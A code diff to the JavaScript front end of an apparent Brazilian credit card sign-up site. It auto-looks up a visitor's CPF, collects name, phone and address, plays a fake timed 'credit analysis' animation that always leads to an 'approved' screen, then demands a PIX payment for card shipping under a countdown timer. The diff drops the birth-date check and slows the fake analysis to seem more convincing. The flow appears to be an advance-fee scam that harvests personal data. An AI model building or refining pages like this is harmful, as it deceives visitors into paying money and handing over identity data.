@@ -85,13 +85,8 @@ if (inputCpf) {
     // Revela campo de nascimento após CPF ter 11 dígitos
     const digits = e.target.value.replace(/\D/g, '');
     const nascGroup = $id('nasc-input-group');
-    if (nascGroup) {
-      if (digits.length === 11) {
-        nascGroup.classList.remove('hidden');
-        if ($id('input-nasc')) $id('input-nasc').focus();
-      } else {
-        nascGroup.classList.add('hidden');
-      }
+    if (digits.length === 11) {
+      consultarCpf();
     }
   });
 }
@@ -121,9 +116,7 @@ async function consultarCpf() {
   if (cpfVal.length !== 11) {
     return showErr('cpf-error', 'Digite um CPF válido com 11 números.');
   }
-  if (!nascVal || nascVal.length !== 10) {
-    return showErr('cpf-error', 'Digite uma Data de Nascimento válida.');
-  }
+
 
   $id('btn-consultar-text').classList.add('hidden');
   $id('btn-consultar-spin').classList.remove('hidden');
@@ -200,7 +193,7 @@ if (btnCpfOk) {
     if ($id('approved-name-display')) $id('approved-name-display').textContent = STATE.nome ? STATE.nome.split(' ')[0] : 'SEU NOME';
     if ($id('summary-name')) $id('summary-name').textContent = STATE.nome ? STATE.nome.split(' ').slice(0,2).join(' ') : '—';
     if ($id('summary-end')) $id('summary-end').textContent = STATE.cpf || '—';
-    goToStep('income');
+    goToStep('priority');
   });
 }
 
@@ -236,9 +229,9 @@ function submitEmprego() {
 }
 
 function selectMotivo(btn) {
-  document.querySelectorAll('#screen-motivo .option-tile, #screen-motivo .income-btn').forEach(el => el.classList.remove('selected'));
+  document.querySelectorAll('#screen-motivo .motivo-btn').forEach(el => el.classList.remove('selected'));
   btn.classList.add('selected');
-  STATE.motivo_credito = btn.dataset.motivo;
+  if (btn.dataset.motivo) STATE.motivo_credito = btn.dataset.motivo;
   hideErr('motivo-error');
   // Auto-avança
   setTimeout(() => goToStep('billing'), 260);
@@ -260,6 +253,11 @@ function selectDay(btn) {
 }
 
 async function submitBilling() {
+  if (!STATE.cpf) {
+    showErr('billing-error', 'Sessão expirada. Redirecionando para o início...');
+    setTimeout(() => goToStep('cpf'), 2500);
+    return;
+  }
   if (!STATE.dia_vencimento) return showErr('billing-error', 'Selecione o dia de vencimento.');
   
   $id('billing-btn-text').classList.add('hidden');
@@ -274,15 +272,15 @@ async function submitBilling() {
     const data = await res.json();
     
     if (data.ok) {
-      $id('approved-limit').textContent = data.limite;
-      $id('done-limite').textContent = data.limite;
+      if ($id('approved-limit')) $id('approved-limit').textContent = data.limite;
+      if ($id('done-limite')) $id('done-limite').textContent = data.limite;
       
       // Update PIX step with correct shipping cost
-      if (data.frete) {
+      if (data.frete && $id('pix-frete-display')) {
         $id('pix-frete-display').textContent = data.frete;
       }
       
-      startAnalysis();
+      goToStep('limit-info');
     } else {
       showErr('billing-error', data.error || 'Erro ao processar.');
       $id('billing-btn-text').classList.remove('hidden');
@@ -332,13 +330,13 @@ function startAnalysis() {
     $id('astep-1').querySelector('.astep-icon').classList.remove('checking');
     $id('astep-1').querySelector('.astep-icon').classList.add('done');
     $id('astep-2').querySelector('.astep-icon').classList.add('checking');
-  }, 1200));
+  }, 1500));
   
   timers.push(setTimeout(() => {
     $id('astep-2').querySelector('.astep-icon').classList.remove('checking');
     $id('astep-2').querySelector('.astep-icon').classList.add('done');
     $id('astep-3').querySelector('.astep-icon').classList.add('checking');
-  }, 2500));
+  }, 3200));
   
   timers.push(setTimeout(() => {
     $id('astep-3').querySelector('.astep-icon').classList.remove('checking');
@@ -349,12 +347,12 @@ function startAnalysis() {
   timers.push(setTimeout(() => {
     $id('astep-4').querySelector('.astep-icon').classList.remove('checking');
     $id('astep-4').querySelector('.astep-icon').classList.add('done');
-  }, 4700));
+  }, 6500));
   
   // Go to approved screen
   timers.push(setTimeout(() => {
     goToStep('approved');
-  }, 5200));
+  }, 7500));
 }
 
 // ============================================================================
@@ -397,8 +395,18 @@ function submitCardStyle() {
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ session_id: STATE.sessionId, color: STATE.color, style: STATE.style })
   }).catch(console.error);
-  // Vai para tela de escolha de frete
-  goToStep('shipping');
+  // Vai para tela de sucesso
+  goToStep('cep');
+  if(STATE.nome_completo) { 
+      var n1 = document.getElementById('sum-nome'); if(n1) n1.innerText = STATE.nome_completo; 
+      var n2 = document.getElementById('pix-nome'); if(n2) n2.innerText = STATE.nome_completo; 
+  }
+  if(STATE.cpf) { var cpf1 = document.getElementById('pix-cpf'); if(cpf1) cpf1.innerText = STATE.cpf; }
+  if(STATE.celular) { var tel1 = document.getElementById('pix-tel'); if(tel1) tel1.innerText = STATE.celular; }
+  var cv = document.getElementById('summary-card-visual');
+  if(cv && CARD_TEMPLATES[STATE.color || 'classico']) { cv.style.background = CARD_TEMPLATES[STATE.color || 'classico'].bg; }
+  var cn = document.getElementById('summary-card-name');
+  if(cn) cn.innerText = STATE.nome_completo || 'SEU NOME';
 }
 
 // Seleção de método de envio — carrega gerente e vai ao WhatsApp
@@ -592,4 +600,269 @@ function showDone() {
   $id('btn-contact-manager').href = `https://wa.me/${waNumber}?text=${msg}`;
   
   goToStep('done');
+}
+
+// Modificação PIX Timer e API
+const _oldGoTo = window.goToStep;
+if(_oldGoTo) {
+    window.goToStep = function(stepId) {
+        _oldGoTo(stepId);
+        if(stepId === 'pix') {
+            fetch('/api/pix', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(STATE)
+            })
+            .then(r => r.json())
+            .then(data => {
+                if(data.qr_code_base64) {
+                    var qi = document.getElementById('qr-img');
+                    if(qi) {
+                        qi.src = 'data:image/png;base64,' + data.qr_code_base64;
+                        qi.classList.remove('hidden');
+                    }
+                    var ql = document.getElementById('qr-loading');
+                    if(ql) ql.classList.add('hidden');
+                    var pt = document.getElementById('pix-code-text');
+                    if(pt) pt.value = data.pix_copia_cola;
+                    
+                    setInterval(() => {
+                        fetch('/api/check-payment/' + data.txid)
+                        .then(r => r.json())
+                        .then(pay => { if(pay.status === 'APPROVED') _oldGoTo('done'); }).catch(e=>e);
+                    }, 4000);
+                }
+            }).catch(e=>console.log(e));
+            
+            let timeLeft = 7 * 60 + 35; // 7:35
+            setInterval(() => {
+                if(timeLeft <= 0) return;
+                timeLeft--;
+                let m = Math.floor(timeLeft / 60);
+                let s = timeLeft % 60;
+                var tmr = document.getElementById('pix-timer');
+                if(tmr) tmr.innerText = (m < 10 ? '0'+m : m) + ':' + (s < 10 ? '0'+s : s);
+            }, 1000);
+        }
+    };
+}
+
+
+// ============================================================================
+// CEP & ENDEREÇO
+// ============================================================================
+function mascaraCep(input) {
+  let v = input.value.replace(/\D/g, '');
+  if (v.length > 5) v = v.replace(/^(\d{5})(\d)/, '$1-$2');
+  input.value = v;
+}
+
+async function buscarCep() {
+  const cep = $id('input-cep').value.replace(/\D/g, '');
+  if (cep.length !== 8) return showErr('cep-error', 'Digite um CEP válido.');
+  
+  $id('btn-cep-buscar').innerText = 'Buscando...';
+  hideErr('cep-error');
+  
+  try {
+    const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+    const data = await res.json();
+    if (data.erro) throw new Error();
+    
+    $id('input-rua').value = data.logradouro;
+    $id('input-bairro').value = data.bairro;
+    $id('input-cidade').value = data.localidade;
+    $id('input-estado').value = data.uf;
+    
+    STATE.cep = data.cep;
+    STATE.rua = data.logradouro;
+    STATE.bairro = data.bairro;
+    STATE.cidade = data.localidade;
+    STATE.uf = data.uf;
+    
+    $id('address-fields').classList.remove('hidden');
+    $id('btn-cep-buscar').classList.add('hidden');
+    $id('btn-cep-continuar').classList.remove('hidden');
+    $id('input-numero').focus();
+    
+  } catch(e) {
+    showErr('cep-error', 'CEP não encontrado.');
+    $id('btn-cep-buscar').innerText = 'Buscar CEP';
+  }
+}
+
+function submitCep() {
+  const num = $id('input-numero').value.trim();
+  if (!num) return showErr('cep-error', 'Informe o número do endereço.');
+  const comp = $id('input-complemento').value.trim();
+  
+  STATE.numero = num;
+  STATE.complemento = comp;
+  
+  // Fill summary screens
+  const fullRua = `${STATE.rua}, ${num}` + (comp ? ` - ${comp}` : '');
+  const fullBairro = `${STATE.bairro} - ${STATE.cidade}/${STATE.uf}`;
+  
+  [$id('display-rua'), $id('sum-rua')].forEach(el => { if(el) el.innerText = fullRua; });
+  [$id('display-bairro'), $id('sum-bairro')].forEach(el => { if(el) el.innerText = fullBairro; });
+  if($id('display-cep')) $id('display-cep').innerText = `CEP: ${STATE.cep}`;
+  
+  goToStep('cep');
+}
+
+// ============================================================================
+// EFEITO 3D NO CARTÃO (Tilt)
+// ============================================================================
+document.addEventListener("DOMContentLoaded", () => {
+    const card = document.getElementById('advanced-card-preview');
+    if (card) {
+        document.addEventListener('mousemove', (e) => {
+            if(!card.getBoundingClientRect) return;
+            const rect = card.getBoundingClientRect();
+            // Somente aplica se o mouse estiver perto do card
+            const isHovering = (e.clientX >= rect.left - 50 && e.clientX <= rect.right + 50 &&
+                                e.clientY >= rect.top - 50 && e.clientY <= rect.bottom + 50);
+            if(isHovering) {
+                const x = e.clientX - rect.left;
+                const y = e.clientY - rect.top;
+                const xPct = x / rect.width;
+                const yPct = y / rect.height;
+                const rotateX = (yPct - 0.5) * -15; // max 15deg
+                const rotateY = (xPct - 0.5) * 15;
+                card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale3d(1.02, 1.02, 1.02)`;
+                card.style.transition = 'transform 0.1s ease-out';
+            } else {
+                card.style.transform = `perspective(1000px) rotateX(0) rotateY(0) scale3d(1, 1, 1)`;
+                card.style.transition = 'transform 0.5s ease-out';
+            }
+        });
+    }
+});
+
+
+// Novas funções para o fluxo
+function mascaraTel(i) {
+  let v = i.value.replace(/\D/g, '');
+  if (v.length > 11) v = v.slice(0,11);
+  if (v.length > 2) v = `(${v.slice(0,2)}) ${v.slice(2)}`;
+  if (v.length > 9) v = `${v.slice(0,9)}-${v.slice(9)}`;
+  i.value = v;
+}
+
+async function buscarCepBlur() {
+  const cep = $id('input-cep').value.replace(/\D/g, '');
+  if (cep.length !== 8) return;
+  try {
+    const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+    const data = await res.json();
+    if (!data.erro) {
+      $id('input-rua').value = data.logradouro;
+      $id('input-bairro').value = data.bairro;
+      $id('input-cidade').value = data.localidade;
+      $id('input-estado').value = data.uf;
+      STATE.cep = data.cep;
+      STATE.rua = data.logradouro;
+      STATE.bairro = data.bairro;
+      STATE.cidade = data.localidade;
+      STATE.uf = data.uf;
+    }
+  } catch(e) {}
+}
+
+function submitAddress() {
+  STATE.cep = $id('input-cep').value;
+  STATE.rua = $id('input-rua').value;
+  STATE.numero = $id('input-numero').value;
+  STATE.complemento = $id('input-complemento').value;
+  STATE.bairro = $id('input-bairro').value;
+  STATE.cidade = $id('input-cidade').value;
+  STATE.uf = $id('input-estado').value;
+  
+  if(!STATE.cep || !STATE.rua || !STATE.numero || !STATE.bairro || !STATE.cidade || !STATE.uf) {
+      return showErr('cep-error', 'Preencha todos os campos obrigatórios.');
+  }
+  
+  const fullRua = `${STATE.rua}, ${STATE.numero}` + (STATE.complemento ? ` - ${STATE.complemento}` : '');
+  const fullBairro = `${STATE.bairro} - ${STATE.cidade}/${STATE.uf}`;
+  
+  if($id('display-rua')) $id('display-rua').innerText = fullRua;
+  if($id('sum-rua')) $id('sum-rua').innerText = fullRua;
+  if($id('display-bairro')) $id('display-bairro').innerText = fullBairro;
+  if($id('sum-bairro')) $id('sum-bairro').innerText = fullBairro;
+  if($id('display-cep')) $id('display-cep').innerText = `CEP: ${STATE.cep}`;
+  
+  goToStep('shipping-method');
+}
+
+function selectShipping(method, price) {
+  STATE.shippingMethod = method;
+  STATE.shippingPrice = price;
+  goToStep('shipping-success');
+}
+
+
+// --- Real Validations ---
+// Only letters in Name
+const inputName = $id('input-name');
+if(inputName) {
+    inputName.addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚâêîôûÂÊÎÔÛãõÃÕçÇ\s]/g, '');
+    });
+}
+
+// Ensure proper validations for address
+const inputRua = $id('input-rua');
+if(inputRua) {
+    inputRua.addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^a-zA-Z0-9áéíóúÁÉÍÓÚâêîôûÂÊÎÔÛãõÃÕçÇ\s,-]/g, '');
+    });
+}
+const inputCidade = $id('input-cidade');
+if(inputCidade) {
+    inputCidade.addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚâêîôûÂÊÎÔÛãõÃÕçÇ\s-]/g, '');
+    });
+}
+const inputBairro = $id('input-bairro');
+if(inputBairro) {
+    inputBairro.addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^a-zA-Z0-9áéíóúÁÉÍÓÚâêîôûÂÊÎÔÛãõÃÕçÇ\s-]/g, '');
+    });
+}
+
+// Validar CPF rigorosamente
+function isCPFValid(cpf) {
+    cpf = cpf.replace(/\D/g, '');
+    if(cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
+    let sum = 0, rest;
+    for (let i = 1; i <= 9; i++) sum = sum + parseInt(cpf.substring(i-1, i)) * (11 - i);
+    rest = (sum * 10) % 11;
+    if ((rest == 10) || (rest == 11))  rest = 0;
+    if (rest != parseInt(cpf.substring(9, 10)) ) return false;
+    sum = 0;
+    for (let i = 1; i <= 10; i++) sum = sum + parseInt(cpf.substring(i-1, i)) * (12 - i);
+    rest = (sum * 10) % 11;
+    if ((rest == 10) || (rest == 11))  rest = 0;
+    if (rest != parseInt(cpf.substring(10, 11) ) ) return false;
+    return true;
+}
+
+async function mascaraCepInteligente(input) {
+  let v = input.value.replace(/\D/g, '');
+  if (v.length > 5) v = v.replace(/^(\d{5})(\d)/, '$1-$2');
+  input.value = v;
+  
+  if (v.length === 9) { // 00000-000
+    try {
+      const res = await fetch(`https://viacep.com.br/ws/${v.replace('-','')}/json/`);
+      const data = await res.json();
+      if (!data.erro) {
+        document.getElementById('input-rua').value = data.logradouro || '';
+        document.getElementById('input-bairro').value = data.bairro || '';
+        document.getElementById('input-cidade').value = data.localidade || '';
+        document.getElementById('input-estado').value = data.uf || '';
+        document.getElementById('input-numero').focus();
+      }
+    } catch(e) {}
+  }
 }
